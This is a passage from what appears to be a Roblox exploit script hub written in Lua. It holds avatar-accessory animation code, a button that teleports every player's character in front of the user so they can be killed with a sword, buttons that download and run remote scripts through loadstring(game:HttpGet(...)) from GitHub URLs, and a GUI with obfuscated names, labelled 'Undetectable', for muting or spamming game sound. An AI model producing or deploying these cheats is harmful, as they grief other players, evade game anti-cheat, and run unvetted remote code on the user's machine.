RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run

elseif Root.Velocity.Magnitude < 20 then -- walk
hat('Nike Shoebox Costume','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('VANS_Umbrella','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('MeshPartAccessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),5.23+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Vector Arrow','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),4.15+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('TwitterBird','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),3.08+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Nebula Blade','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2.54+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('bloxcxy','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Slime1Accessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),1.47+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Robloxclassicred','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),0.39+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+-20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
end

elseif Mode == '2' then
if Root.Velocity.y > 1 then -- jump
elseif Root.Velocity.y < -1 then -- fall
elseif Root.Velocity.Magnitude < 2 then -- idle
hat('Nike Shoebox Costume','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('VANS_Umbrella','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('MeshPartAccessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),5.23+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Vector Arrow','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),4.15+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('TwitterBird','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),3.08+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Nebula Blade','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2.54+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('bloxcxy','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Slime1Accessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),1.47+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Robloxclassicred','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),0.39+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run

elseif Root.Velocity.Magnitude < 20 then -- walk
hat('Nike Shoebox Costume','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('VANS_Umbrella','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('MeshPartAccessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),5.23+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Vector Arrow','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),4.15+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('TwitterBird','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),3.08+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Nebula Blade','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2.54+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('bloxcxy','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Slime1Accessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),1.47+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Robloxclassicred','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),0.39+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+-20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
end

elseif Mode == 'Attack1' then --attack clerp 
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-0.14+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+89.64*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Mode == 'Attack2' then --attack clerp 
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-0.14+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+89.64*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Mode == 'Attack3' then --attack clerp 

end
srv.RenderStepped:Wait()
end
end)()

  	end    

})

Tab:AddButton({

	Name = "吸人（可攻击）",

	Callback = function()

     -- 你必须有一把剑才能正常发挥.
-- This only works on sword fighting games like Crossroads, Sword Fight on Bridge, and Fencing (如果玩家在黑色垫子上)
-- All you have to do is press the "吸人可攻击" button, and then take out your sword and click to kill everyone, and you're done! :)

-- Objects

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")

-- Properties

ScreenGui.Parent = game.CoreGui

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(1, 0.388235, 0.368627)
Frame.BorderColor3 = Color3.new(0.67451, 0.211765, 0.152941)
Frame.Position = UDim2.new(0.293040276, 0, 0.491666675, 0)
Frame.Size = UDim2.new(0.106227107, 0, 0.0833333284, 0)
Frame.Active = true
Frame.Draggable = true

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton.BackgroundTransparency = 0.80000001192093
TextButton.Position = UDim2.new(0.103524067, 0, 0.200333327, 0)
TextButton.Size = UDim2.new(0.793684483, 0, 0.601000011, 0)
TextButton.Font = Enum.Font.SourceSansLight
TextButton.FontSize = Enum.FontSize.Size14
TextButton.Text = "杀死所有人"
TextButton.TextScaled = true
TextButton.TextSize = 14
TextButton.TextWrapped = true

run = false
TextButton.MouseButton1Click:connect(function()
run = not run
local function tp()
for i, player in ipairs(game.Players:GetChildren()) do
if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
player.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 1
end
end
end
if run then
while wait() do
if run then
tp()
end
end
end
end)

  	end    

})

Tab:AddButton({

	Name = "车子模型",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/AlexCr4sh/FeScripts/main/FeCarScript.lua", true))()

  	end    

})

Tab:AddButton({

	Name = "电脑键盘",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()

  	end    

})

Tab:AddButton({

	Name = "死亡声音",

	Callback = function()

     --sound thingy

--[[
Made By Scripty#2063
If You Gonna showcase this , make sure to Credit me , do not take that you are owner of the script
This Gui is Undetectable
RespectFilteringEnabled must be false to use it
--]]

local ScreenGui = Instance.new("ScreenGui")
local Draggable = Instance.new("Frame")
local Frame = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local Time = Instance.new("TextLabel")
local _1E = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local _3E = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local SE = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Path = Instance.new("TextLabel")
local Top = Instance.new("Frame")
local Top_2 = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local Exit = Instance.new("TextButton")
local Minizum = Instance.new("TextButton")
local Stop = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local IY = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local Wait = Instance.new("TextBox")

--Properties:

ScreenGui.Name = ". Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ"
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Draggable.Name = "Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ."
Draggable.Parent = ScreenGui
Draggable.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Draggable.BackgroundTransparency = 1.000
Draggable.BorderSizePixel = 0
Draggable.Position = UDim2.new(0.35026139, 0, 0.296158612, 0)
Draggable.Size = UDim2.new(0, 438, 0, 277)

Frame.Name = ". . Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ. "
Frame.Parent = Draggable
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(-0.00133678317, 0, -0.00348037481, 0)
Frame.Size = UDim2.new(0, 438, 0, 277)

Frame_2.Name = " . Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ. "
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(-0.00133678142, 0, -0.0179207586, 0)
Frame_2.Size = UDim2.new(0, 438, 0, 238)
Frame_2.Active = true
Frame_2.Draggable = true

Time.Name = "Time"
Time.Parent = Frame_2
Time.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Time.BackgroundTransparency = 1.000
Time.Position = UDim2.new(0, 0, 0.0126050422, 0)
Time.Size = UDim2.new(0, 437, 0, 31)
Time.Font = Enum.Font.GothamSemibold
Time.Text = "RespectFilteringEnabled(RFE) : nil"
Time.TextColor3 = Color3.fromRGB(255, 255, 255)
Time.TextScaled = true
Time.TextSize = 14.000
Time.TextWrapped = true

_1E.Name = "1E"
_1E.Parent = Frame_2
_1E.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
_1E.BorderSizePixel = 0
_1E.Position = UDim2.new(0.0182648394, 0, 0.676470578, 0)
_1E.Size = UDim2.new(0, 208, 0, 33)
_1E.Font = Enum.Font.SourceSans
_1E.Text = "Mute Game"
_1E.TextColor3 = Color3.fromRGB(255, 255, 255)
_1E.TextScaled = true
_1E.TextSize = 30.000
_1E.TextWrapped = true

UICorner.Parent = _1E

_3E.Name = "3E"
_3E.Parent = Frame_2
_3E.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
_3E.BorderSizePixel = 0
_3E.Position = UDim2.new(0.0159817357, 0, 0.142857149, 0)
_3E.Size = UDim2.new(0, 209, 0, 33)
_3E.Font = Enum.Font.SourceSans
_3E.Text = "Annoying  Sound"
_3E.TextColor3 = Color3.fromRGB(255, 255, 255)
_3E.TextSize = 30.000
_3E.TextWrapped = true

UICorner_2.Parent = _3E

SE.Name = "SE"
SE.Parent = Frame_2
SE.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
SE.BorderSizePixel = 0
SE.Position = UDim2.new(0.509132445, 0, 0.142857149, 0)
SE.Size = UDim2.new(0, 209, 0, 33)
SE.Font = Enum.Font.SourceSans
SE.Text = "Kill Sound Service"
SE.TextColor3 = Color3.fromRGB(255, 255, 255)
SE.TextSize = 30.000
SE.TextWrapped = true

UICorner_3.Parent = SE

Path.Name = "Path"
Path.Parent = Frame_2
Path.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Path.BackgroundTransparency = 1.000
Path.Position = UDim2.new(0.00684931502, 0, 0.815126061, 0)
Path.Size = UDim2.new(0, 435, 0, 44)
Path.Font = Enum.Font.GothamSemibold
Path.Text = "Dev Note : This Script is FE and it only FE when RespectFilteringEnabled(RFE) is disabled , elseif RespectFilteringEnabled(RFE) is true then it only be client , mostly RespectFilteringEnabled(RFE) disabled game are classic game"
Path.TextColor3 = Color3.fromRGB(255, 0, 0)
Path.TextScaled = true
Path.TextSize = 14.000
Path.TextWrapped = true

Top.Name = "Top"
Top.Parent = Frame_2
Top.BackgroundColor3 = Color3.fromRGB(41, 60, 157)
Top.BorderColor3 = Color3.fromRGB(27, 42, 53)
Top.BorderSizePixel = 0
Top.Position = UDim2.new(-0.00133678142, 0, -0.128059402, 0)
Top.Size = UDim2.new(0, 438, 0, 30)
Top_2.Name = "Top"
Top_2.Parent = Top
Top_2.BackgroundColor3 = Color3.fromRGB(30, 45, 118)
Top_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Top_2.BorderSizePixel = 0
Top_2.Position = UDim2.new(0, 0, 0.967638671, 0)
Top_2.Size = UDim2.new(0, 438, 0, 5)

ImageLabel.Parent = Top
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0, 0, 0.0666666701, 0)
ImageLabel.Size = UDim2.new(0, 29, 0, 27)
ImageLabel.Image = "http://www.roblox.com/asset/?id=8798286232"

TextLabel.Parent = ImageLabel
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.997245014, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 397, 0, 30)
TextLabel.Font = Enum.Font.GothamSemibold
TextLabel.Text = "FEAG"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextWrapped = true

Exit.Name = "Exit"
Exit.Parent = Top
Exit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Exit.BackgroundTransparency = 1.000
Exit.Position = UDim2.new(0.924657524, 0, 0, 0)
Exit.Size = UDim2.new(0, 32, 0, 25)
Exit.Font = Enum.Font.GothamSemibold
Exit.Text = "x"
Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
Exit.TextScaled = true
Exit.TextSize = 14.000
Exit.TextWrapped = true

Minizum.Name = "Minizum"
Minizum.Parent = Top
Minizum.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Minizum.BackgroundTransparency = 1.000
Minizum.Position = UDim2.new(0.851598203, 0, 0, 0)
Minizum.Size = UDim2.new(0, 32, 0, 23)
Minizum.Font = Enum.Font.GothamSemibold
Minizum.Text = "_"
